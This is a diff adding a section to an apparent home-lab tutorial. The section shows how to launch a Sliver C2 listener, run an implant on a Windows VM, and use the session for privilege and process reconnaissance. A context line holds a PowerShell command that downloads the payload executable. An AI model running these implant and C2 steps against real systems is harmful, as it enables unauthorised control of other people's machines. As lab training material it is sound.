@@ -298,3 +298,67 @@ IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Download
 Now would be a good time to snapshot your Windows VM, before we execute the malware.
 
 </details>
+<details>
+  <summary><h2><b>Section 6: Star Command & Control Session  </b></h2></summary>
+
+1. **Now that the payload is on the Windows VM, switch back to the Linux VM SSH session and enable the Sliver HTTP server to catch the callback**
+
+- Terminate the python web server by pressing "Ctrl + C"
+- Now, relaunch Sliver
+```
+sliver-server
+```
+- Start the Sliver HTTP listener
+```
+http
+```
+- If you get an error starting the HTTP listener, reboot the VM
+
+2. **Return to the Windows VM and execute the C2 payload from its download location using the same admin PowerShell prompt**
+```
+C:\Users\User\Downloads\<your_C2-implant>.exe
+```
+
+3. **Within a few moments, you should see your session check in on the Sliver server**
+
+4. **Verify your session in Sliver, and note its Session ID**
+```
+sessions
+```
+5. **To interact with your new C2 session, type the following command into the Sliver shell**
+```
+use [session_id]
+```
+6. **C0ngratulations! You pwned your Windows VM. Now, run a few basic commands**
+
+- To get info about the session
+```
+info
+```
+- Find out the user and learn his privileges
+```
+whoami
+```
+```
+getprivs
+```
+- If your implant was properly run with Admin rights, you’ll notice you have a few privileges that make further attack activity much easier, such as “SeDebugPrivilege” — if you don't see these privileges, make sure you ran the implant from an Admin command prompt
+- Identify our implant’s working dir
+```
+pwd
+```
+- Examine network connections occurring on the remote system
+```
+netstat
+```
+- Identify running processes on the remote system
+```
+ps -T
+```
+> Notice that Sliver highlights its own process in green and any defensive tools in red. This is how attackers become aware of what security products a victim system using.
+  </details>
+
+<details>
+  <summary><h2><b>Section :  </b></h2></summary>
+
+  </details>
